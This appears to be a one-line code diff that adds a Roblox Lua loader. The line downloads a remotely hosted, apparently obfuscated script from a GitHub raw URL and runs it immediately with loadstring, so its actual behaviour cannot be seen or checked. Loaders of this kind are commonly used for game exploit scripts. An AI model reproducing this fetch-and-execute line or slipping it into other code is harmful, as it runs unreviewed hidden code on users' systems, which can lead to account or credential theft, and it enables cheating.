@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/IkridEstine/soPro/main/obfuscate', true))()
